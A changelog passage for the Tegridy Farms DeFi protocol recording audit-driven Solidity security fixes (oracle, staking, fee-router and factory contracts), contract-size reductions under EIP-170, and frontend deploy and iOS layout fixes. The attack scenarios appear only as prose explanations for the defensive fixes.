+- **H-F** `d67105b7` — `WETHFallbackLib.safeTransferETHOrWrapNoRevert`'s `mode==2` contract ("deposit succeeded, transfer failed, caller MUST sweep the stranded WETH") obligated callers to credit the stranded path but did not enforce it, so a future consumer routing `success=false` into a treat-as-failure branch would silently accumulate WETH and break `address(this).balance` accounting. Investigation found **zero callers anywhere** — the function was added for batched-payee consumers that in fact use the reverting variant. Deleted, with its two events. The commit wrote its own carve-out for a future reintroduction (a battle-tested pattern with consumer-local tests proving the stranded-credit path, "rather than reviving dead code lulled by sunk-cost comment archaeology") — **and that carve-out was invoked the next day** when the NFT AMM came back and turned out to be the missing consumer.
+
+### Security — the rescan found two of the review's own fixes were regressions, and reverting one of them introduced a third bug (2026-05-30)
+
+The three batches after H-F are all self-inflicted, and the sequence is worth keeping intact: **a fix, a revert of the fix, a bug created by the revert, and then a bug the whole chain had merely shifted one observation forward.**
+
+`6a556483` (H-Z) reverted two earlier batches from the same day.
+
+- The H-E expiry-cap fix was **structurally dead code that regressed the documented [M5] intent.** `forfeited > 0` can only fire when the first `_settleUnsettled` has already cap-saturated, at which point the second call computes `unsettledRoom = maxCap - maxCap = 0` and force-settles nothing for any non-zero forfeited amount — making the expiry branch semantically identical to the plain-forfeit branch. Combined with host-side decay zeroing `boostedAmount`, the cap-blocked tail became permanently unrecoverable, which is precisely the failure mode [M5] existed to prevent. The pre-fix inline force-settle was restored, with the cap bypass now documented as intentional: earned tokens under the Synthetix "no silent forfeiture" pattern, `maxUnsettledRewards` as flow control rather than a loss gate.
+- The H-C `lastSpot` gate was over-restrictive. Changing `!forcedBypass` to `!bypassed` correctly closed the bootstrap sandwich but **also blocked the dormancy-bypass branch from reseeding the baseline** — and after a legitimate dormancy bypass the old `lastSpot` is stale by definition, since a >20% drift during the dormant window is why the bypass was invoked. The next honest observation would trip `PriceDeviationTooLarge` and need the 24h admin-reset path instead of self-healing. Revised to `!forcedBypass && count > 2`, which keeps the bootstrap window closed, restores dormancy recovery, and preserves the outage rule.
+
+`701fa363` (H-ZZ) then caught a **new HIGH introduced by that revert**: with `count > 2`, dormancy, *and* a sequencer outage all true, the dormancy branch sets `bypassed = true` first, the outage block is guarded on `!bypassed` and is therefore skipped entirely, `forcedBypass` stays false, and `lastSpot` is overwritten from frozen reserves during the outage — mathematically violating the L5 invariant that the code's own comment block states in words. `forcedBypass` is now computed unconditionally as a pure function of `bridgingGapTrip || sequencerOutage`, decoupled from `bypassed`, and the four cases (single outage, single dormancy, combined, honest) each behave correctly. Bundled housekeeping in the same commit: a stale `safeTransferETHOrWrapNoRevert` reference dropped from `WETHFallbackLib` L41, and the README's library inventory refreshed after the day's deletions and splits — 6 utility files and 36 total became 10 and 40, adding `PauseGuardian`, `StakingRewardLib`, `StakingViewLib`, `SwapFeeRouterConvertLib` and `TegridyFactoryLib`, and dropping `SafeERC721Call`.
+
+`ecf09545` (H-ZZZ) is a fourth-round pass by three fresh parallel agents, and it found **two real bugs that the prior fix batches had missed**.
+
+- The H-C/H-Z/H-ZZ chain closed the bootstrap sandwich but **shifted the attack one observation forward.** With `lastSpot` left at 0 through observation #3, the first permissionless observation (#4) enters the deviation branch, reads `prev0 = 0`, and the `if (prev0 > 0)` guard skips the check entirely — so #4 writes the baseline unchecked, and #5 onward are gated against whatever #4 said. An attacker watching the mempool for #4 at the `MIN_PERIOD` boundary can bundle a flash-loan reserve distortion, land the lie as the baseline, and force honest observations to either fit within a 20% bend of it or trip `PriceDeviationTooLarge` and brick the buffer for 24h. The commit is explicit that this made the attack **cheaper than the pre-H-C state**, because the gate now only bites from #5. Fixed by requiring `msg.sender == owner()` when either previous spot is zero, anchoring the baseline under the same trust assumption as the `count<=2` grace, and the adversarial recheck confirms it does not re-open the bootstrap sandwich because the `count<=2` path still writes no `lastSpot`.
+- `MIN_DISTRIBUTE_STAKE` was checked against the **live** total at both entry points while `_distribute`'s epoch denominator reads the **historical** value at T-1, and the mismatch admits a concentration attack: stake the minimum early so it settles by T-1, wait for honest users to stake large amounts at block T, then call `distributePermissionless()` — live passes the entry guard, the historical denominator is the attacker alone, and their snapshot power equals the whole denominator, so **they can claim the entire epoch**. No `GenesisEpochUnsettled` fires, because the historical value is non-zero. A new `StakeBelowMinimumAtSnapshot` error enforces the guardrail at the denominator instead of at the door, with Curve's FeeDistributor checking `ve_supply[week]` against the same snapshot cited as the pattern of record; the H-B genesis revert is untouched and still fires first on `locked == 0`, keeping the two errors semantically distinct.
+
+Sizes after both: `TegridyStaking` 24,569 (unchanged, 7 B of headroom), `TegridyTWAP` 14,787 (+48 B), `RevenueDistributor` 22,926 (+31 B). Suite 1472/0 on the unit run.
+
+### Security — eight MEDIUMs across eight files: an overflow that would silently DoS conversions, and a sweep whose destination was a free parameter (2026-05-30)
+
+Two batches from the same review, M-1 (`130055c6`, five findings) and M-2 (`db7c6846`, three), one finding per file. Suite 1472/0 on both.
+
+- **`RevenueDistributor` token sweep destination hard-pinned to treasury.** `proposeTokenSweep` accepted an arbitrary `to`, so the captured-key blast radius was "tokens drained to an attacker through a 48h timelock" rather than the intended "tokens stuck in the protocol, recoverable by rotating treasury". The execute-time destination is now the treasury, which is itself timelock-rotatable — so **a captured key cannot rotate treasury and sweep inside less than 48h + 48h.** Mirrors the SwapFeeRouter `executeSweepETH` fix from 2026-05-16.
+- **`SwapFeeRouter.applyPremiumAccess` validates it is given a contract.** Pre-fix it accepted any address, and after Pectra an EOA with a 7702 delegation can return whatever it likes from `hasPremiumSecure(user)` — including conditioning the answer on caller identity, so attacker-controlled addresses get up to `MAX_PREMIUM_DISCOUNT_BPS` off while honest users pay full. The length-23 carve-out rejects 7702-delegated EOAs (`0xef0100‖addr`); `address(0)` stays the explicit disable path. Mirrors the sister setters.
+- **`SwapFeeRouterConvertLib` routed through `Math.mulDiv`.** `(amountIn * priceDiff) / (uint64(elapsed) * Q112)` used checked 0.8 arithmetic, and for tokens with high WETH-relative reserve ratios — WBTC, low-supply ERC-20s — `priceDiff` can reach 1e46+, pushing the numerator toward uint256 max and **triggering a `Panic(0x11)` that silently DoSes owner-only multi-hop conversions.** OZ `Math.mulDiv`'s 512-bit intermediate gives the same answer at normal magnitudes and the correct one at high magnitudes.
+- **`POLAccumulator` fair-LP maths likewise.** `Math.sqrt((K * toweliUnit) / twapEthPer1eToweli)` could overflow with K near `uint112 * uint112`; it never trips at realistic mainnet reserves, but a forward-compatible redeploy against a >18-decimal token and a deep pool would silently DoS `executeHarvestLP`.
+- **`OwnableNoRenounce` rejects `transferOwnership(0)`.** OZ documents zero as "cancel", but the override unconditionally stamps `ownershipTransferExpiresAt = now + 14d`, leaving the inconsistent pair `_pendingOwner == 0` with a live expiry — and `pokeOwnershipExpiryWarning` would then emit `OwnershipTransferExpiringIn(address(0), …)` and pollute indexers. `cancelOwnershipTransfer` is the canonical path; the OZ shortcut is now rejected with `PendingOwnerZeroAddress`, named distinctly to avoid colliding with child contracts' own `ZeroAddress` errors.
+- **`VotePowerOracle.powerAt` now enforces `ts < block.timestamp`.** The bound was NatSpec-only, so a consumer reaching for `powerAt(user, block.timestamp)` — reasonably believing the epoch-pinned variant is the safe one — would get **exactly the same flash-stake-vulnerable read as `powerOfLiveUnsafe`**, because `Trace208.upperLookup(T)` includes a checkpoint written at T. The call signature now enforces the snapshot semantic instead of leaving it to discipline.
+- **`TegridyTWAP` per-pair `minReserveFloor` floored at 1000 wei.** Any non-zero value was accepted, including 1. On a 6-decimal pair, a 1-wei floor lets reserve0 fall to a single base unit while `spotPrice0 = reserve1 * 2^112`, at which point **the deviation gate's basis-point maths is meaningless** because the denominator is dominated by the 2^112 factor. New `FloorTooLow` rejects anything under 1000, UniV2's `MINIMUM_LIQUIDITY`; zero remains the "use default" path.
+- **`TegridyRestaking.fundBonus` now accrues after the deposit, not before.** The `updateBonus` modifier ran the accrual cap against the pre-deposit balance and then advanced `lastBonusRewardTime` to now, so the just-deposited funds never backfilled the elapsed slice — and **an honest operator topping up would see `pendingBonus` not move and double-fund, believing the first call failed.** The modifier is removed and `_accrueBonusChecked()` inlined after the transfer and the `totalBonusFunded` bump, matching Curve gauge factory's fund-then-accrue topology.
+
+### Changed — EIP-170: three contracts that could not be deployed at all, and TegridyStaking cleared by 39 bytes (2026-05-29 → 2026-05-30)
+
+The May 26-28 audit-fix waves were paid for in bytecode. `TegridyFactory` reached 25,443 B on the back of the M1 `acceptFeeToSetter` pagination and `SwapFeeRouter` reached roughly 27.8 KB on the SFR fixes — **both past the 24,576-byte EIP-170 limit, i.e. the `DeployMVP` broadcast could not `CREATE` them at all.**
+
+The two library splits use the proven `StakingRewardLib` delegatecall pattern.
+
+- `af176b7f` — `SwapFeeRouter`'s token→ETH conversion cluster (`convertTokenFeesToETH{,FoT}`, path validation, cooldown, cumulative read, TWAP-floor helpers, the `PriceSnapshot` struct and the UniV2 interfaces) moved to `SwapFeeRouterConvertLib`. Byte-identical behaviour: mappings pass by storage reference, the scalar `accumulatedETHFees` is marshalled in and written back through a single assignment choke-point, immutables and owner pass via a `Cfg` struct, and `nonReentrant`/`whenNotPaused` stay host-side with `msg.sender` preserved through delegatecall. Events and errors re-declared with identical selectors. **~27.8 KB → 21,392 B**, +3,184 headroom.
+- `fbf34f11` — `TegridyFactory` gave up two clusters to `TegridyFactoryLib`: the bytecode-heavy ERC-777 detection probing (ERC-165, granularity, all three ERC-1820 hook interfaces, every staticcall capped at 30k gas), with the `blockedTokens` gate deliberately left host-side because it touches storage; and the CREATE2 pair deployment, **which carries `type(TegridyPair).creationCode` — about 11 KB — out of the host bytecode entirely.** The executor is still the Factory under delegatecall, so the deterministic pair address and the pair's `factory = msg.sender` are byte-identical. **25,443 → 12,133 B**, +12,443 headroom.
+
+`TegridyStaking` took six commits and produced the most useful measurement in the group.
+
+- `67b22a8b` laid down DRY helpers and visibility golf: an internal `_ownedPosition` collapsing the owner-check/load/amount triplet from nine user-facing functions, a consolidated `StakingViewLib.resolveJbac` for the JBAC re-validation block copy-pasted into three, and two externals demoted to internal after a repo-wide grep found no callers. The commit is honest that it was **net +305 B and therefore making the problem worse.**
+- `febfe998` explains why, and it is the transferable lesson: `resolveJbac` had been added as `public`, so each of its three call sites paid the full delegatecall wrapper tax — the commit measures **roughly 500 B per site of ABI encode, DELEGATECALL and decode**. Flipping it to `internal` keeps the source-level consolidation for audit purposes while inlining byte-identical shapes at each call site: **-1,478 B**, with `StakingViewLib` itself dropping 1,551 → 969 B.
+- `39c83da6` then took the strategy decision explicitly — **more library extraction only nets ~5-50 B per small function because of that same wrapper overhead**, so the heaviest off-chain views move instead to a new stateless sibling. `StakingMonitorView` holds an immutable reference to `TegridyStaking`, has no state, no funds and no privileged role, and re-exposes `earned(uint256)` and `getPosition(uint256)` with byte-identical ABI. `StakingViewLib` gained an `earnedFromMem` memory variant with the same maths body as the storage version, and the commit is candid that **Solidity does not share those bodies and the comment is the only discipline** keeping a future audit fix landing in both.
+- `8ddb4a9c` crossed the line by removing `totalLocked()`, a one-line view proxy returning `totalStaked` that AUDIT H-4 had added to work around an old state-variable-zero bug. `public uint256 totalStaked` already has an auto-getter with identical semantics. **24,570 B, six bytes of margin** — enough to deploy. *That removal is the origin of a frontend break recorded later: the 2026-07-28 selector-drift entry finds `usePoolData` still reading `totalLocked()` on-chain and reverting forever.*
+- `3767819e` widened the margin the only way the minimal-surface mandate allows — **zero new custom code, three verbatim Solady drop-ins**: OZ `SafeERC20` → Solady `SafeTransferLib`, OZ `SafeCast` → Solady `SafeCastLib`, and OZ `EnumerableSet.UintSet` → Solady `EnumerableSetLib.Uint256Set` in `StakingRewardLib`. `TegridyRestaking` takes a `StakingMonitorView` immutable and reads `monitor.earned(tokenId)`, and 21 staking and restaking test files were mechanically ported to route view calls through the sibling. **24,570 → 24,537 B, 39 B of headroom.**
+- `16d3efad` wired the sibling into `DeployMVP` at step 7b so its address is available for the deploy summary, and spelled out the operator consequence: publish the `StakingMonitorView` address with the rest of the set, and **frontends and indexers must migrate `staking.earned` / `staking.getPosition` to the sibling**, because those methods no longer exist on the host.
+
+`21c2ec44` closed out two long-standing red tests, both confirmed stale rather than contract bugs, and one of them is storage-layout drift of exactly the kind this work causes. `FRESH2026_F3_StakingJbacRestakerLookup` hardcoded `POSITIONS_SLOT = 17` since the May-26 layout, but the re-split inserted `_nextTokenId` at 17 and pushed `positions` to 18 (re-verified with `forge inspect TegridyStaking storage-layout`; the `JBAC_DEPOSITED_OFFSET = 5` struct offset is unchanged). The other is semantic: `RedTeam_Staking::test_DEFENDED_nftTransferSettlesRewards` still asserted the pre-L-15 expectation that settling on transfer resets `rewardDebt` to the full accrual, where L-15 deliberately changed it to advance by `totalCredited` only when the pool is under-funded, so the uncredited slice stays recoverable on the position instead of being silently forfeited. **The realignment pins the actual security invariant rather than the old literal** — settle must credit the sender's unsettled, the Synthetix principal-recoverable invariant must hold on both sides of the transfer, and `sender.unsettled + new_owner.earned <= pending_at_transfer + 1`, upper-bounding total recoverable so the `rewardDebt` advance cannot mint rewards from nothing. Full suite **1524 passed / 0 failed / 0 skipped — the commit records this as the first time every MVP-path contract was both under EIP-170 and fully green since the May 26-28 waves landed.**
+
+### Changed — the first-mint front-run fix shipped, was reverted three hours later with no recorded reason, and re-landed as canonical Router02 code (2026-05-27 → 2026-05-30)
+
+H2 — a front-runner seeding a new pair at a manipulated price before the creator's first mint — was opened by the May audit pass and closed three times.
+
+- `8cddffc1` (05-27) implemented it as an opt-in gate modelled on Uniswap V3's `initialize`: `createPairProtected` sets `firstMinter = creator`, `grantFirstMintRight` delegates to a router, and `TegridyPair.mint` gates on `firstMinter` while `totalSupply == 0`. `createPair` was left unchanged, with `address(0)` meaning unrestricted for backward compatibility. Six `Audit195_Factory` tests.
+- `d4237f6d` (05-28) reverted it in full. **The revert commit records no reason**; the later re-fix places it about three hours after the original and likewise notes no recorded reason.
+- `0766c7c5` (05-30) re-landed it differently, and the reasoning is the point. The opt-in pattern was Claude-authored and **added new API surface across both Factory and Pair**, which the battle-tested-bulletproof mandate treats as the expensive direction. The structurally cleaner fix is the canonical Uniswap V2 Router02 create-or-find — `if (factory.getPair(A, B) == address(0)) pair = factory.createPair(A, B);` — verbatim from code that has been on mainnet since 2020. **Bundling pair creation and first mint into one atomic transaction closes the window structurally: there is no inter-transaction gap for an attacker to seed the pool.**
+
+The commit is explicit about what this does *not* cover, rather than claiming completeness: the direct `factory.createPair(...)` → `TegridyPair.mint(...)` path is still open, but it is a power-user or contract-integration flow where the integrator already controls both transactions and can guard their own first mint, and the body estimates 99% of LPs go through the router. `TegridyRouter._calculateLiquidity` already handled empty reserves at line 570, using caller-supplied desired amounts exactly as Router02 does. The now-obsolete `test_addLiquidity_revertWhen_pairNotFound` was replaced by `test_addLiquidity_autoCreatesPairIfMissing`; removal paths still require an existing pair, correctly, since you cannot burn LP from a pool that does not exist, and the other `PAIR_NOT_FOUND` assertions in the suite are swap paths and unaffected. Full suite 1524/0.
+
+### Security — two unbounded loops that could brick their own contracts, a forfeiture clock any flash loan could reset, and a daily ETH cap (2026-05-27 → 2026-05-28)
+
+Nine audit findings and their fallout. **Two are the same defect in two contracts — an owner-only recovery path written as an unbounded loop, which turns a griefing vector into a permanent brick** — and both are closed with the OZ Governor batched-execute shape rather than a gas tweak.
+
+- **M1** `d080ea20` — `TegridyFactory.acceptFeeToSetter` iterated `_pendingTokenBlocks` and `_pendingPairDisables` in unbounded loops, so **a griefing setter could queue hundreds of proposals and push the function past the block gas limit, permanently bricking setter rotation.** Rotation is now O(1) with the loops removed: the old setter's proposals expire naturally after the 7-day `PROPOSAL_VALIDITY` and cannot be executed by anyone but the current setter, so the incoming setter is never exposed to hostile execution while draining. `flushStaleProposals(tokenCount, pairCount)` pages the cleanup at `MAX_FLUSH_BATCH = 50` per leg, with two count views to drive it and swap-safe internal helpers that always pop the current last element.
+- **M3** `9d4ca9bb` — the same shape in `RevenueDistributor`: `proposeForfeitReclaim`/`executeForfeitReclaim` were `O(epochs.length)`, a **provable out-of-gas DoS after year 3+ of a live protocol.** Now the propose call stores the epoch window in `pendingForfeitStartEpoch`/`pendingForfeitEndEpoch` and execute replays it for *both* the eligibility re-check and the write loop, so both are bounded; a `proposeForfeitReclaimPaged(amount, start, end)` form exists for a long-lived protocol, the 1-arg API is unchanged, and `cancelForfeitReclaim` plus the `acceptOwnership` flush clear the stored window.
+- **M6** `003ecb3e` — `ReferralSplitter.markBelowStake` reset `lastBelowStakeTime = 0` whenever power was at or above threshold, and the function was permissionless. **A flash-loan attacker could boost stake above threshold, call `markBelowStake` to reset the clock, drop stake, re-mark, and repeat every 7 days — permanently preventing forfeiture.** The reset path is removed, so the function only ever *starts* the clock. Clearing is now an owner-gated two-step on the Aave V3 pattern: `proposeClearBelowStakeMark` requires power at or above threshold now, a 24h timelock runs, and `executeClearBelowStakeMark` re-verifies at execute time — **and you cannot hold a flash loan for 24 hours.** `CLEAR_BELOW_STAKE_MARK` is flushed in `acceptOwnership` against a hostile-owner booby-trap, and the existing test that asserted the reset was rewritten to assert the mark *stays*.
+- **M5** `a132c6e7` — `StakingRewardLib.getReward` kept forfeited dust when a position expired and the protocol could not cover the shortfall; it now credits that dust to `unsettledRewards`/`unsettledRewardsByTokenId` instead of burning it silently. Decay moved host-side into `TegridyStaking._getReward`, running after the library returns, mirroring how `kick` already worked — which **also eliminated an EVM stack-too-deep that via-IR could not resolve inside the already-deep library call chain (a 17-slot frame).**
+- **M7** `b114c0d6` — `POLAccumulator` gained a rolling 24-hour ETH cap, default 50 ETH (5× the per-call cap), lazily reset on the first post-interval call, so **a single key compromise cannot drain the balance across back-to-back hourly `accumulate()` calls.** Timelocked propose/execute/cancel at 24h with a hard `MAX_DAILY_ETH_CAP` of 500 ETH. Eight tests; suite 78/78. The next day `abd637fd` **corrected the provenance label rather than leaving it wrong**: this is a fixed-window rate limiter, a Chainlink CCIP `RateLimiter` analog, and *not* the Compound/Aave `supplyCap` the original commit named — a supply cap is an absolute ceiling, which is a different mechanism. Comment only; mechanism and tests unchanged.
+- **L1 / L5 / L11** `66e75aaf` — `pokeOwnershipExpiryWarning` gained a 1-hour `POKE_COOLDOWN` and a `lastPokeTime` slot, since it is permissionless and was therefore an event-log spam vector. `SwapFeeRouter.applyReferralSplitter` now rejects EOAs and 7702-delegated EOAs by `code.length == 0 || code.length == 23`, mirroring the admin-validation pattern already at L1120-1124. And `TegridyTWAP.withdrawFees` sweeps `address(this).balance` rather than `accumulatedFees`, so **ETH stranded by direct sends or `update()` refunds is swept instead of locked indefinitely.** 95/95 SwapFeeRouter and 27/27 TWAP.
+- **DEPLOY-H1** `990745b4` — `SwapFeeRouter`'s constructor now takes a mandatory fifth `_revenueDistributor` argument that reverts on zero, **so the revenue pipeline is provably wired at deploy time rather than by a follow-up transaction somebody has to remember.** `applyRevenueDistributor` survives for governance rotation, `DeployMVP` passes the address, `VerifyMVP` adds INV-14 asserting the wiring, and nine test files were updated to the 5-arg form (with a UTF-8 BOM left by a PowerShell bulk edit stripped in the same pass).
+
+`5194d61e` cleaned up after L1: adding `uint256 public lastPokeTime` to `OwnableNoRenounce` **shifted every SwapFeeRouter child-contract storage slot by one**, and four test files hard-coded slot 10 for `vm.store`/`vm.load` of `accumulatedTokenFees`. Bumped to 11, inline comments updated, 1528/1530 — the two remaining failures pre-existing and unrelated, and both cleared three days later in the EIP-170 work above.
+
+### Fixed — Tradermigos listings were invisible on iPhone, and the trait-offers panel had been dead for every visitor (2026-05-27)
+
+`eb2ff7ff`, from a user report: "on my iPhone, no listings showing on Tradermigos." Desktop rendered 789 listing cards; mobile showed nothing where listings should be.
+
+**The cause was a flex-plus-`order` reorder pattern that iOS Safari does not lay out correctly.** The wrapper used `display:flex` with `flex-wrap:wrap`, `.listings-sidebar` first in the DOM at `order: 2` and `.listings-content` second at `order: 1`; iOS Safari has known bugs reflowing wrapped flex children with `order` when `flex-basis` is a percentage, and the second ordered item fails to lay out below the first on wrap — so the listings rendered at scroll position 0, behind or overlapping the sidebar, and visually disappeared. Replaced with CSS Grid `grid-template-areas`: `"content sidebar"` at desktop, stacked `"content" "sidebar"` at ≤1024px. Named grid areas are deterministic across browsers, and the commit notes OpenSea and Blur use the same layout on their collection pages.
+
+A second iOS failure mode was closed alongside it: `.listing-card` combines `backdrop-filter`, `aspect-ratio` and `overflow:hidden` on one element, and **iOS Safari has a documented bug where that triple intermittently collapses the element to zero height.** The existing `@media (max-width: 767px) backdrop-filter: none` override — already present on the `.glass-*` classes for performance — was extended to cover `.listing-card`, which closes the failure mode and matches the existing rationale.
+
+The same commit **reverted a speculative fix from twenty-four minutes earlier and recorded why.** `40f05ab2` had chased a console warning — OpenSea v2's `offers/collection/{slug}/traits` was returning 400 with "'mode' parameter is required, or provide filter params" — by sending `mode=best`, matching the OpenSea Pro / Blur best-offer-per-trait semantic the panel renders. Live testing then showed the endpoint rejects that too: no `mode` gives "'mode' parameter is required", `mode=best` gives "Invalid value 'best'", and `mode=top` gives "Invalid value 'top'". Until the valid values are verified or the call migrates to the filter-param form, `fetchTraitOffers` returns `{}` directly. **User-visible behaviour is unchanged either way, because the panel had been silently empty for every visitor since before the first fix** — the caller's `try`/`catch` swallowed the 400 — so what actually changed is that the noisy warning is gone.
+
+Verified by reloading `/nakamigos/nakamigos` at desktop through the Chrome extension: 789 cards render in grid, no console errors, layout preserved. (The `gridTemplateAreas` read of `"content sidebar"` with the old flex-wrap pattern absent comes later the same day, against production, in the deploy entry above.) The commit is explicit that **the mobile viewport itself could not be checked on an ultrawide host monitor**, and rests on the two iOS Safari workarounds being well-established rather than on a mobile observation.
+
+### Fixed — every deploy since 2026-05-24 died on a serverless-function quota, not the outage it looked like (2026-05-27)
+
+`9c2b0dbf`. The frontend shipped 15 serverless functions and the Vercel Hobby plan caps a deployment at 12. **Every push since 2026-05-24 had been dying at that same line, and the failure mode is what hid it**: the GitHub-Vercel status integration reports "failure" immediately at deploy-create time with no `updated_at` change, which reads like a project-level outage rather than a quota rejection. `tegridyfarms.vercel.app` sat on the 2026-05-24 build the whole time. The commit records the root cause as found by running the `vercel` CLI directly, which returned the quota message in plain text: no more than 12 serverless functions on the Hobby plan.
+
+The seven per-aggregator proxies — cow, kyber, lifi, odos, openocean, paraswap, swapapi — were each a thin wrapper around `_lib/aggregator-proxy.js#runProxy` with a per-provider config, and they collapse into one catchall at `api/aggregator/[provider]/[...path].js`. **The provider configs are verbatim copies of what lived in each provider's own file** — same `matchPath`, `allowedQuery`, `extraHeaders` and `rateLimit` — so no security policy was relaxed to fit the quota. The old URL paths are preserved by `vercel.json` rewrites (`/api/odos/:path*` → `/api/aggregator/odos/:path*`, and the same for the other six), so `frontend/src/lib/aggregator.ts` keeps hitting the old URLs and needed no change at all. **15 → 9 functions.**
+
+The same commit added a repo-root `.vercelignore`, without which `vercel --prod` could not run from the repo root: the project link was nested at `frontend/.vercel/` and the Root Directory setting resolved to `frontend/frontend`. Restricting uploads to `frontend/` minus `node_modules`, `dist` and build artefacts also got the upload back under the 10 MB limit. The commit records the deploy succeeding, the alias moving, and a Chrome-extension check confirming the CSS Grid mobile fix below was live in production — **and that this is the change that finally got weeks of queued audit and mobile fixes to users.**
+
+### Security — `SwapFeeRouter.receive()` cost ~6.5k gas against WETH9's 2,300-gas stipend, and every test used a mock that could not see it (2026-05-26)
+
+The single CRITICAL of the 2026-05-26 swarm audit. The `receive()` body carried a warm
+SSTORE plus a LOG2 — the commit puts it at roughly 6.5k gas — while canonical
+`WETH9.withdraw()` pays out with `.transfer()`, which forwards exactly 2,300.
+**Every WETH-input swap's fee balance would have OOG'd inside
+`convertTokenFeesToETH(WETH)` and been stranded permanently.**
+
+The reason 152 passing SwapFeeRouter tests said nothing about it is the interesting
+part: their mock WETH pays with `.call` (full gas), not `.transfer(2300)`, so the
+failure mode was structurally invisible to the suite that owned it.
+
+The body is now empty. The `totalETHReceived` storage variable and the `ETHReceived`
+event declaration went with it, confirmed unused outside the contract — `sweepETH`
+reserves against `accumulatedETHFees + totalPendingDistribution`, never against
+`totalETHReceived`. The canary,
+[`contracts/test/C01_SwapFeeRouter_ReceiveStipend.t.sol`](contracts/test/C01_SwapFeeRouter_ReceiveStipend.t.sol),
+drives a real `.transfer(2300)` **and carries a negative control that re-installs the
+pre-fix SSTORE+LOG2 body**, so the harness is proved to detect the OOG rather than
+merely passing. 152/152 existing SwapFeeRouter tests plus 2/2 new.
+
+*Correction to the record.* This same commit is what added the 308-line
+`AUDIT_FINDINGS_2026_05_26_SWARM.md`. The later `c5c0d7fd` says it "adds the two audit
+artifacts referenced by the prior commit" and describes the report as 306 lines;
+`git show --stat c5c0d7fd` shows one file, `restaking_audit_fixes_2026_05_26.patch`.
+The report had already arrived here.
+
+### Security — The swarm's contract half: a WETH sweep past the split, a multi-hop guarded only by a $0.30 floor, and a residual claim locked to the previous owner (2026-05-26)
+
+The commit bodies record the audit as **22 parallel agents over every file in
+`mvp-launch` scope** — 15 main contracts, 3 base, 6 lib, 7 deploy scripts, the frontend
+`api/`+`src/`+`supabase/` trees, the indexer and the configs — producing **172 findings:
+1 CRITICAL, 23 HIGH, 39 MEDIUM, 56 LOW, 53 INFO/verified-clean**, every line annotated
+`[FILE:LINE]`. Twenty-five fix commits landed the same day. The contract-side ones:
+
+- **SwapFeeRouter H-01/H-02/H-03/H-10 + L-06/L-08** (`1c1e9dde`). `getPair(WETH, WETH)`
+  returns `address(0)` because UniV2 rejects same-token pairs, so the existing reject at
+  line 1916 never fired for WETH and a captured owner could `sweepTokens` donated WETH
+  **past the staker/POL split**; an explicit `token == WETH` reject now mirrors
+  `withdrawTokenFees` at line 1581. H-02 is the sharper one: multi-hop conversion's only
+  defence was the absolute `MIN_MULTIHOP_ETH_OUT_WEI = 1e14` floor (~$0.30 by the
+  commit's reckoning), so a captured key with a large token balance could route through a
+  sandwich-controlled path and lose up to *balance − $0.30*. Where a direct token/WETH
+  pair exists, `minETHOut` must now clear `max(twapMin, MIN_MULTIHOP_ETH_OUT_WEI,
+  callerMin)`; the bypass survives only for a genuine no-route case. H-03 found the same
+  branch skipping the L2 sequencer-uptime check the 2-hop branch inherits via
+  `_enforceTWAPMinETHOut` — a captured owner could convert against frozen pre-outage
+  reserves. All three applied to `convertTokenFeesToETH` and `...FoT` for parity.
+- **TegridyRestaking H-04 + M-01/02/03/05/06/09** (`0e43df4f`). `_reserveResidual`
+  preserved a stale `_residualClaimant` when `prior != claimant`, so: Alice restakes and
+  exits with residue, sells the NFT to Bob, Bob restakes and exits with residue R′ —
+  and R′ is written to Alice. The cross-holder gate then blocks Alice too, **bricking
+  R′ until the owner runs the 7-day clear cycle**. Now the current exiting caller always
+  wins, since they physically own the residue. Alongside: `decayExpiredRestaker` read
+  `staking.positions` *before* triggering lazy decay and so reverted `NoDecay` when decay
+  was due; `_hasRecoveredPrincipal` was sticky per-user rather than per-position;
+  `claimPendingBonusPayout` and the irreversible `waiveResidualClaim` could both fire
+  mid-incident without `whenNotPaused`; and `sweepStuckRewards` was split behind a 24h
+  propose/execute, the one-shot left as a revert pointer.
+- **StakingRewardLib H-05 + L-13** (`95f878d5`). `getReward` advanced
+  `p.rewardDebt = accumulated` to the full pre-decay figure *before* the unsettled cap or
+  pool saturation was known, so under saturation the holder's unpaid slice was silently
+  forfeited — the next claim saw `diff <= 0` and skipped it. `kick` at line 527 already
+  refused to destroy value (`KickWouldForfeit`); the claim path now advances by only the
+  amount actually credited, so the slice re-credits once the pool clears. L-13 stopped
+  `kick` emitting `RewardPaid` for a credit that never left the contract.
+- **TegridyFactory and TegridyTWAP** (`798cf0ac`). `acceptFeeToSetter` now flushes every
+  per-token and per-pair proposal the outgoing setter queued (H-08), closing a silent
+  mass-disable on rotation; `proposeGuardianChange(address(0))` is rejected (L-26);
+  `_rejectERC777` fails closed on ambiguous 1..31-byte `supportsInterface` returndata
+  (L-32). TWAP got the same `acceptOwnership` flush plus explicit timelocks on the
+  per-pair reserve floor (24h) and the global fee recipient (7d).
+- **POLAccumulator M-14/M-15 and RevenueDistributor M-17/L-20** (`21d62dda`). The
+  duplicated spot-vs-TWAP deviation check was collapsed into one helper — *drift between
+  two copies of the same security gate was the finding*. `proposeForfeitReclaim` gained
+  the `whenNotPaused` its sibling already had, so a captured owner cannot pre-queue
+  during a pause; and `_pendingETH` now returns 0 while staking is paused instead of
+  advertising claimables every write path would reject.
+- **Views, admin and referral surfaces.** `StakingViewLib.earned()` bails before an
+  `int256` cast that would wrap negative and make the UI say "no pending" (M-18);
+  `OwnableNoRenounce` gained a permissionless `pokeOwnershipExpiryWarning()` that fires
+  only in the last 24h of the 14-day window (M-20) (`816c0c8f`). SwapFeeRouterAdmin
+  rejects zero-value fee overrides, no-op executes and removals with no override to
+  remove (`5eb68380`). ReferralSplitter stopped routing sub-BPS dust to the caller's pull
+  credit — an attacker could siphon it with tiny-amount spam — added `totalForfeited` so
+  consumers stop reading forfeited value as earned, rejected EOA grants pre-setup, and
+  put a **7-day grace after `executeBanReferrer`**, because the captured-owner path was
+  previously 24h ban timelock then instant forfeit (`2327d92d`).
+- **Two NatSpec-only invariants** (`86794664`): the EIP-712 ShortString fast-path
+  constraint on Toweli's name/version, and the JSON-injection invariant left behind when
+  `_jsonEscape` was deleted — the commit states plainly that both are documentation-only,
+  with no logic, ABI or storage change. `f703e2b1` is *not* documentation-only despite
+  reading that way: alongside codifying restaking's "donations welcome" semantics it adds
+  a new `totalBonusClaimable(user)` view (L-03) that sums `pendingBonus` +
+  `unforwardedBonusRewards` so UIs stop showing 0 for deferred payouts, and a
+  StakingRewardLib orphan-tokenId cleanup (L-16) that zeroes a per-tokenId slot left
+  non-zero against a fully drained holder bucket.
+
